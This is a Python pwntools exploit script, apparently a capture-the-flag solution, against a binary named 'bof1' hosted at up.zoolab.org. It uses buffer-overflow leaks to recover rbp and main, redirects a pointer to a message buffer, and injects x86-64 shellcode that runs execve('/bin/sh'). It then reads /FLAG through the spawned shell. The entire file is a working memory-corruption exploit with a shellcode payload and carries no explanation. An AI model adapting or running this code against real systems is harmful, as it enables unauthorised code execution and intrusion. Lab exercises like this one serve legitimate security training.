#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# get rbp
payload = 'A' * (39 - 8) + '?'
garbo = r.recvuntil('name? '.encode())
r.send( payload.encode())
given = r.recvline()
rbp = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
# print( hex(rbp))


# get main address
payload = 'A' * 39 + '?'
garbo = r.recvuntil('number? '.encode())
r.send( payload.encode())
given = r.recvline()
main = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
print( hex(main))


# write to ret address to msg
msg_ptr = main - 0x8ae4 + 0xd31e0
payload = b'A' * 39 + b'?' + p64(msg_ptr)
garbo = r.recvuntil('name? '.encode())
r.send( payload)
given = r.recvline()



# write shellcode to msg
codes = """
    xor rax, rax
    push rax
    mov rsi, rsp

    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    mov rax, 0x3b
    mov rdx, rsi
    syscall

    mov rdi, 0x0
    mov rax, 60
    syscall
"""

payload = asm(codes)
garbo = r.recvuntil('message: '.encode())
r.send( payload)

# remove all the garbage
garbo = r.recvuntil('you!\n'.encode())

# read file
cat_comm = 'cat /FLAG\n'
r.sendline( cat_comm.encode())
given_flag = r.recv().decode()
r.close()
print( given_flag[:-1])

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :

